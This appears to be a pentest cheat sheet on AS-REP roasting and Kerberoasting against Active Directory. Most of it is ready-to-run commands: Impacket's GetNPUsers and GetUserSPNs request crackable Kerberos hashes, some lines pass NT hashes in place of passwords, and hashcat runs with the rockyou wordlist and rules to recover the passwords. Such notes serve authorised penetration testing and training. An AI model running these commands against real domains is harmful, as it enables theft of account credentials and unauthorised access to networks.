# 07.05 GetNPUsers.py GetUserSPNs.py AS-REP Roasting Kerberoasting

> Pull AS-REP (hashcat 18200) and TGS (13100) hashes for cracking with Impacket's `GetNPUsers.py` and `GetUserSPNs.py`.

## Overview

GetNPUsers finds accounts with DONT_REQUIRE_PREAUTH (AS-REP Roastable). GetUserSPNs finds accounts with SPNs and requests TGS tickets for offline cracking. Both output hashcat-compatible hashes.

## Steps

- AS-REP: needs a user list if unauthenticated; authenticated finds all preauth-disabled accounts
- Kerberoasting: authenticated only — requests RC4 (etype 23) TGS for all SPN accounts by default
- Use -format hashcat for hashcat mode 18200 (AS-REP) and 13100 (Kerberoast)
- Request only specific users with -usersfile to reduce noise
- RC4 tickets crack faster; AES-only accounts cannot be Kerberoasted via RC4 downgrade
- Crack with hashcat: -m 18200 (AS-REP), -m 13100 (TGS-REP)

## Commands

### AS-REP Roasting — unauthenticated with user list

```bash
impacket-GetNPUsers DOMAIN/ -dc-ip DC_IP -no-pass -usersfile users.txt -format hashcat
impacket-GetNPUsers DOMAIN/ -dc-ip DC_IP -no-pass -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt
```

### AS-REP Roasting — authenticated (finds all)

```bash
impacket-GetNPUsers DOMAIN/user:'P@ss' -dc-ip DC_IP -request -format hashcat
impacket-GetNPUsers -hashes :NThash DOMAIN/user -dc-ip DC_IP -request -format hashcat -outputfile asrep.txt
```

### Kerberoasting — list SPNs only

```bash
impacket-GetUserSPNs DOMAIN/user:'P@ss' -dc-ip DC_IP
impacket-GetUserSPNs -hashes :NThash DOMAIN/user -dc-ip DC_IP
```

### Kerberoasting — request tickets

```bash
impacket-GetUserSPNs DOMAIN/user:'P@ss' -dc-ip DC_IP -request -format hashcat -outputfile kerb.txt
impacket-GetUserSPNs -hashes :NThash DOMAIN/user -dc-ip DC_IP -request -outputfile kerb.txt
```

### Crack with hashcat

```bash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### Kerberoasting — target specific user

```bash
impacket-GetUserSPNs DOMAIN/user:'P@ss' -dc-ip DC_IP -request-user sqlsvc -format hashcat
```
